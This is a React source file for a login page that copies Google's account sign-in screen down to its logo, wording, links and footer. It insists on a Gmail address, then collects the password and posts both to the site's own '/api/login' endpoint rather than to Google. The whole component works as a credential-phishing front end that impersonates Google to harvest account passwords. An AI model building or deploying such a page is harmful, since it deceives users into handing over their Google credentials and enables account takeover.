import {
  Box,
  Button,
  Checkbox,
  Flex,
  HStack,
  Input,
  FormControl,
  FormLabel,
  Link,
  Text,
  VStack,
  Image,
  Select,
  useColorModeValue,
} from "@chakra-ui/react";
import { ChevronDownIcon } from "@chakra-ui/icons";
import { FaUserCircle } from "react-icons/fa";
import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { useAuth } from "../contexts/AuthContext";

// Notched outline input (Material Design) — adapts to dark/light
function NotchedInput({ label, value, onChange, type = "text", isDark }) {
  const [focused, setFocused] = useState(false);
  const isFloated = focused || value.length > 0;

  const borderDefault = isDark ? "#5f6368" : "#dadce0";
  const borderHover   = isDark ? "#e8eaed" : "#202124";
  const borderFocus   = isDark ? "#8ab4f8" : "#1a73e8";
  const labelDefault  = isDark ? "#9aa0a6" : "#5f6368";
  const labelFocus    = isDark ? "#8ab4f8" : "#1a73e8";
  const textColor     = isDark ? "white"   : "#202124";
  const inputBg       = isDark ? "#202124" : "white";

  return (
    <FormControl position="relative">
      <Input
        type={type}
        value={value}
        onChange={onChange}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        h="56px"
        pt={isFloated ? "20px" : "0"}
        pb="0"
        pl="16px"
        pr="16px"
        bg={inputBg}
        borderColor={focused ? borderFocus : borderDefault}
        borderWidth={focused ? "2px" : "1px"}
        borderRadius="4px"
        fontSize="16px"
        color={textColor}
        _hover={{ borderColor: focused ? borderFocus : borderHover }}
        _focus={{ boxShadow: "none", borderColor: borderFocus, borderWidth: "2px" }}
        _placeholder={{ color: "transparent" }}
        autoComplete="off"
      />
      <FormLabel
        position="absolute"
        top={isFloated ? "8px" : "50%"}
        left="16px"
        transform={isFloated ? "translateY(0)" : "translateY(-50%)"}
        fontSize={isFloated ? "12px" : "16px"}
        color={focused ? labelFocus : labelDefault}
        fontWeight="400"
        pointerEvents="none"
        transition="all 0.15s ease"
        zIndex={1}
        m={0}
        lineHeight="1"
        bg={inputBg}
        px="4px"
        mx="-4px"
      >
        {label}
      </FormLabel>
    </FormControl>
  );
}

export default function Login() {
  const [email, setEmail]               = useState("");
  const [password, setPassword]         = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep]                 = useState(1);
  const [isDark, setIsDark]             = useState(
    () => window.matchMedia("(prefers-color-scheme: dark)").matches
  );

  const navigate = useNavigate();
  const location = useLocation();
  const { login, isAuthenticated } = useAuth();

  // Follow OS dark/light mode changes live
  useEffect(() => {
    const mq = window.matchMedia("(prefers-color-scheme: dark)");
    const handler = (e) => setIsDark(e.matches);
    mq.addEventListener("change", handler);
    return () => mq.removeEventListener("change", handler);
  }, []);

  useEffect(() => {
    if (isAuthenticated) {
      const from = location.state?.from?.pathname || "/menu";
      navigate(from, { replace: true });
    }
  }, [isAuthenticated, navigate, location]);

  const handleNext = () => {
    if (!email) return alert("Please enter your Gmail address.");
    if (!email.toLowerCase().endsWith("@gmail.com"))
      return alert("Please use your Gmail address (example@gmail.com)");
    setStep(2);
  };

  const handleLogin = async () => {
    if (!password) return alert("Please enter your password.");
    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data?.error || "Login failed");
      const accessToken  = data.accessToken  || `temp_token_${data.user.id}`;
      const refreshToken = data.refreshToken || `temp_refresh_${data.user.id}`;
      login(accessToken, refreshToken, data.user);
      const from = location.state?.from?.pathname || "/menu";
      navigate(from, { replace: true });
    } catch (err) {
      console.error(err);
      alert(err.message || "Failed to login.");
    }
  };

  // Theme tokens
  const pageBg    = isDark ? "#1a1a1a"  : "#f1f3f4";
  const cardBg    = isDark ? "#202124"  : "white";
  const cardBorder= isDark ? "none"     : "1px solid #dadce0";
  const headingC  = isDark ? "white"    : "#202124";
  const subtitleC = isDark ? "#9aa0a6"  : "#5f6368";
  const bodyTextC = isDark ? "#e8eaed"  : "#202124";
  const linkColor = isDark ? "#8ab4f8"  : "#1a73e8";
  const footerC   = isDark ? "#9aa0a6"  : "#70757a";
  const chipBg    = isDark ? "#303134"  : "#f1f3f4";
  const chipBorder= isDark ? "#5f6368"  : "#dadce0";
  const chipHover = isDark ? "#3c3c3c"  : "#e8eaed";
  const btnBg     = isDark ? "#a8c7fa"  : "#1a73e8";
  const btnColor  = isDark ? "#062e6f"  : "white";
  const btnHover  = isDark ? "#c2d8fb"  : "#1765cc";

  const NextBtn = ({ onClick }) => (
    <Button
      bg={btnBg}
      color={btnColor}
      fontSize="14px"
      fontWeight="600"
      px={7}
      h="40px"
      borderRadius="20px"
      _hover={{ bg: btnHover }}
      _active={{ bg: isDark ? "#8ab4f8" : "#1558b0" }}
      _focus={{ boxShadow: "none" }}
      onClick={onClick}
    >
      Next
    </Button>
  );

  return (
    <Flex
      minH="100vh"
      bg={pageBg}
      justify="center"
      align="center"
      direction="column"
      fontFamily="'Google Sans', Roboto, Arial, sans-serif"
    >
      {/* Card */}
      <Flex direction="column" w="100%" flex="1" justify="center" align="center" px={4}>
        <Box
          w="100%"
          maxW="780px"
          bg={cardBg}
          border={cardBorder}
          borderRadius="28px"
          overflow="hidden"
        >
          {step === 1 ? (
            /* ── STEP 1: Email ── */
            <Flex direction={{ base: "column", md: "row" }} minH="360px">
              {/* Left */}
              <Flex
                direction="column"
                justify="flex-start"
                w={{ base: "100%", md: "340px" }}
                flexShrink={0}
                px={{ base: 8, md: 11 }}
                pt={10}
                pb={10}
                gap={3}
              >
                <Image
                  src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"
                  alt="Google"
                  boxSize="40px"
                  mb={2}
                />
                <Text fontSize="32px" fontWeight="400" color={headingC} lineHeight="1.15">
                  Sign in
                </Text>
                <Text fontSize="16px" color={subtitleC} fontWeight="400">
                  Use your Google Account
                </Text>
              </Flex>

              {/* Right */}
              <Flex
                direction="column"
                justify="space-between"
                flex="1"
                px={{ base: 8, md: 10 }}
                pt={10}
                pb={8}
              >
                <VStack align="stretch" spacing={5}>
                  <NotchedInput
                    label="Email or phone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    type="email"
                    isDark={isDark}
                  />

                  <Link
                    href="https://accounts.google.com/signin/recovery"
                    isExternal
                    color={linkColor}
                    fontSize="14px"
                    fontWeight="500"
                    _hover={{ textDecoration: "underline" }}
                    display="block"
                  >
                    Forgot email?
                  </Link>

                  <Box pt={2}>
                    <Text fontSize="14px" color={bodyTextC} lineHeight="1.7" mb={1}>
                      Not your computer? Use Guest mode to sign in privately.
                    </Text>
                    <Link
                      href="https://support.google.com/chrome/answer/6130773"
                      isExternal
                      color={linkColor}
                      fontSize="14px"
                      fontWeight="500"
                      _hover={{ textDecoration: "underline" }}
                    >
                      Learn more about using Guest mode
                    </Link>
                  </Box>
                </VStack>

                <HStack justify="space-between" align="center" pt={10}>
                  <Link
                    href="https://accounts.google.com/signup"
                    isExternal
                    color={linkColor}
                    fontSize="14px"
                    fontWeight="500"
                    _hover={{ textDecoration: "underline" }}
                  >
                    Create account
                  </Link>
                  <NextBtn onClick={handleNext} />
                </HStack>
              </Flex>
            </Flex>
          ) : (
            /* ── STEP 2: Password ── */
            <Flex direction={{ base: "column", md: "row" }} minH="360px">
              {/* Left */}
              <Flex
                direction="column"
                justify="flex-start"
                w={{ base: "100%", md: "340px" }}
                flexShrink={0}
                px={{ base: 8, md: 11 }}
                pt={10}
                pb={10}
                gap={3}
              >
                <Image
                  src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"
                  alt="Google"
                  boxSize="40px"
                  mb={2}
                />
                <Text fontSize="32px" fontWeight="400" color={headingC} lineHeight="1.15">
                  Welcome
                </Text>

                {/* Email chip */}
                <HStack
                  spacing={2}
                  bg={chipBg}
                  border={`1px solid ${chipBorder}`}
                  borderRadius="20px"
                  px={3}
                  py="6px"
                  cursor="pointer"
                  onClick={() => setStep(1)}
                  _hover={{ bg: chipHover }}
                  w="fit-content"
                  maxW="260px"
                >
                  <Box color={subtitleC} flexShrink={0} fontSize="18px">
                    <FaUserCircle />
                  </Box>
                  <Text
                    fontSize="14px"
                    color={headingC}
                    noOfLines={1}
                    maxW="170px"
                  >
                    {email}
                  </Text>
                  <ChevronDownIcon color={subtitleC} boxSize={4} flexShrink={0} />
                </HStack>
              </Flex>

              {/* Right */}
              <Flex
                direction="column"
                justify="space-between"
                flex="1"
                px={{ base: 8, md: 10 }}
                pt={10}
                pb={8}
              >
                <VStack align="stretch" spacing={5}>
                  <NotchedInput
                    label="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    type={showPassword ? "text" : "password"}
                    isDark={isDark}
                  />

                  <Checkbox
                    isChecked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    size="md"
                    sx={{
                      ".chakra-checkbox__control": {
                        borderColor: isDark ? "#5f6368" : "#dadce0",
                        bg: "transparent",
                        borderRadius: "3px",
                        borderWidth: "2px",
                      },
                      ".chakra-checkbox__control[data-checked]": {
                        bg: isDark ? "#8ab4f8" : "#1a73e8",
                        borderColor: isDark ? "#8ab4f8" : "#1a73e8",
                        color: isDark ? "#062e6f" : "white",
                      },
                    }}
                  >
                    <Text fontSize="14px" color={bodyTextC}>
                      Show password
                    </Text>
                  </Checkbox>
                </VStack>

                <HStack justify="space-between" align="center" pt={10}>
                  <Link
                    href="https://accounts.google.com/signin/v2/challenge/pwd"
                    isExternal
                    color={linkColor}
                    fontSize="14px"
                    fontWeight="500"
                    _hover={{ textDecoration: "underline" }}
                  >
                    Try another way
                  </Link>
                  <NextBtn onClick={handleLogin} />
                </HStack>
              </Flex>
            </Flex>
          )}
        </Box>
      </Flex>

      {/* Footer */}
      <Flex
        w="100%"
        justify="space-between"
        align="center"
        px={8}
        py={5}
        color={footerC}
        direction={{ base: "column", sm: "row" }}
        gap={{ base: 3, sm: 0 }}
      >
        <Select
          w="fit-content"
          minW="210px"
          bg="transparent"
          border="none"
          color={footerC}
          fontSize="13px"
          _focus={{ outline: "none", boxShadow: "none" }}
          iconColor={footerC}
          cursor="pointer"
        >
          <option value="en" style={{ background: isDark ? "#202124" : "white", color: isDark ? "white" : "#202124" }}>
            English (United States)
          </option>
          <option value="fil" style={{ background: isDark ? "#202124" : "white", color: isDark ? "white" : "#202124" }}>
            Filipino
          </option>
          <option value="es" style={{ background: isDark ? "#202124" : "white", color: isDark ? "white" : "#202124" }}>
            Español
          </option>
        </Select>

        <HStack spacing={8}>
          <Link href="https://support.google.com/accounts" isExternal color={footerC} fontSize="13px" _hover={{ textDecoration: "underline" }}>Help</Link>
          <Link href="https://policies.google.com/privacy" isExternal color={footerC} fontSize="13px" _hover={{ textDecoration: "underline" }}>Privacy</Link>
          <Link href="https://policies.google.com/terms" isExternal color={footerC} fontSize="13px" _hover={{ textDecoration: "underline" }}>Terms</Link>
        </HStack>
      </Flex>
    </Flex>
  );
}
